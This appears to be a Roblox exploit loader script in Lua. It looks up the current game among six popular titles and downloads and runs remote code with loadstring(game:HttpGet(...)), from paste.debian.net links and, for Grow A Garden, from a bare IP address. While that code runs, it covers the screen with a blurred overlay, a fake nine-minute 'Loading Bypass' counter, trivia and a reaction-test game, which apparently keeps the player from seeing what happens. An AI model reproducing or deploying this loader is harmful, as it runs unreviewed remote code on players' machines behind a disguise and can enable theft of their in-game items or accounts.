local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local placeId = game.PlaceId

-- Game info for themed loading screens
local gameInfo = {
    [142823291] = { -- Murder Mystery 2
        bgColor = Color3.fromRGB(255, 0, 0),
        title = "MURDER MYSTERY 2 🔪🩸",
        facts = {
            "MM2 was created by Nikilis in 2014.",
            "The most expensive knife ever sold cost over 500,000 seers.",
            "There are 3 main roles: Innocent, Sheriff, Murderer.",
            "The game was originally called 'Murder'."
        },
        script = "https://paste.debian.net/plainh/4c9365af/"
    },
    [126884695634066] = { -- Grow A Garden
        bgColor = Color3.fromRGB(0, 200, 0),
        title = "GROW A GARDEN 🐶🌱",
        facts = {
            "You can plant seeds and raise pets.",
            "The most expensive pet costs millions of coins.",
            "You can combine seeds to make rare plants.",
            "Some pets boost your farming speed."
        },
        script = function()
            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
            loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
        end
    },
    [8737899170] = { -- Pet Simulator 99
        bgColor = Color3.fromRGB(0, 100, 255),
        title = "PET SIMULATOR 99 🐾💎",
        facts = {
            "PS99 was released in 2023 by BIG Games.",
            "Some pets are worth billions of gems.",
            "Hatching eggs can give you huge pets.",
            "Trading Plaza is where players trade rare pets."
        },
        script = "https://paste.debian.net/plainh/f7e3fafa/"
    },
    [18901165922] = { -- Pets GO
        bgColor = Color3.fromRGB(255, 165, 0),
        title = "PETS GO 🐕🏃",
        facts = {
            "Pets GO is inspired by Pet Simulator mechanics.",
            "You can race pets to earn rewards.",
            "Some pets can only be unlocked during events.",
            "The game updates frequently with new worlds."
        },
        script = "https://paste.debian.net/plainh/b11ed528/"
    },
    [920587237] = { -- Adopt Me
        bgColor = Color3.fromRGB(255, 192, 203),
        title = "ADOPT ME 🍼🐕",
        facts = {
            "Adopt Me has a huge trading community.",
            "Pets can be evolved into Neons.",
            "You can own vehicles and houses.",
            "Regular events drop rare pets."
        },
        script = "https://paste.debian.net/plainh/e1b2c69b/"
    },
    [2753915549] = { -- Blox Fruits
        bgColor = Color3.fromRGB(0, 0, 0),
        title = "BLOX FRUITS 🍉⚔️",
        facts = {
            "Blox Fruits has over 8 billion visits.",
            "You can unlock powerful fruits with unique skills.",
            "PvP battles are intense and competitive.",
            "The game is inspired by One Piece anime."
        },
        script = "https://paste.debian.net/plainh/dcc899d0/"
    }
}

local gameData = gameInfo[placeId]

-- Blur effect
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 40

local function createLoadingScreen(info)
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "LoadingScreen"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.new(0,0,0)
    bg.BackgroundTransparency = 0

    -- Title
    local title = Instance.new("TextLabel", bg)
    title.AnchorPoint = Vector2.new(0.5,0.5)
    title.Position = UDim2.new(0.5,0,0.35,0)
    title.Size = UDim2.new(0.9,0,0.15,0)
    title.BackgroundTransparency = 1
    title.Text = info.title
    title.TextColor3 = Color3.new(1,1,1)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBlack

    -- Fun facts at bottom
    local fact = Instance.new("TextLabel", bg)
    fact.AnchorPoint = Vector2.new(0.5,0)
    fact.Position = UDim2.new(0.5,0,0.85,0)
    fact.Size = UDim2.new(0.9,0,0.06,0)
    fact.BackgroundTransparency = 1
    fact.TextColor3 = Color3.fromRGB(200,200,200)
    fact.TextScaled = true
    fact.Font = Enum.Font.GothamBold

    task.spawn(function()
        local index = 1
        while gui.Parent do
            fact.Text = info.facts[index]
            index = (index % #info.facts) + 1
            task.wait(8)
        end
    end)

    -- Loading bypass
    local bypass = Instance.new("TextLabel", bg)
    bypass.AnchorPoint = Vector2.new(0.5,0)
    bypass.Position = UDim2.new(0.5,0,0.9,0)
    bypass.Size = UDim2.new(0.5,0,0.05,0)
    bypass.BackgroundTransparency = 1
    bypass.TextColor3 = Color3.new(1,1,1)
    bypass.TextScaled = true
    bypass.Font = Enum.Font.GothamBold

    local maxBypass = 25200
    task.spawn(function()
        for i=0,maxBypass do
            bypass.Text = "Loading Bypass " .. i .. "/" .. maxBypass
            task.wait(540/ maxBypass) -- 9 minutes
        end
    end)

    -- Reaction test
    local reactionLabel = Instance.new("TextLabel", bg)
    reactionLabel.AnchorPoint = Vector2.new(0.5,0.5)
    reactionLabel.Position = UDim2.new(0.5,0,0.5,0)
    reactionLabel.Size = UDim2.new(0.6,0,0.08,0)
    reactionLabel.BackgroundTransparency = 1
    reactionLabel.TextColor3 = Color3.new(1,1,1)
    reactionLabel.Font = Enum.Font.GothamBlack
    reactionLabel.TextScaled = true
    reactionLabel.Text = ""

    local btn = Instance.new("TextButton", bg)
    btn.AnchorPoint = Vector2.new(0.5,0.5)
    btn.Position = UDim2.new(0.5,0,0.6,0)
    btn.Size = UDim2.new(0.3,0,0.08,0)
    btn.Text = "REACTION TEST"
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
    btn.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,12)

    local reactionTimes = {}

    btn.MouseButton1Click:Connect(function()
        reactionLabel.Text = "WAIT FOR GREEN..."
        bg.BackgroundColor3 = Color3.fromRGB(200,0,0)
        task.delay(math.random(1,5), function()
            bg.BackgroundColor3 = info.bgColor
            local startTime = tick()
            local conn
            conn = bg.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    local rt = tick()-startTime
                    table.insert(reactionTimes,rt)
                    reactionLabel.Text = string.format("%.3f seconds",rt)
                    bg.BackgroundColor3 = Color3.new(0,0,0)
                    conn:Disconnect()
                end
            end)
        end)
    end)

    return gui
end

if gameData then
    task.spawn(function()
        local ok, err = pcall(function()
            if typeof(gameData.script) == "function" then
                gameData.script()
            else
                loadstring(game:HttpGet(gameData.script,true))()
            end
        end)
        if not ok then warn("[Loader] Failed to run script:",err) end
    end)
    createLoadingScreen(gameData)
else
    warn("[Loader] No script for this PlaceId:",placeId)
end
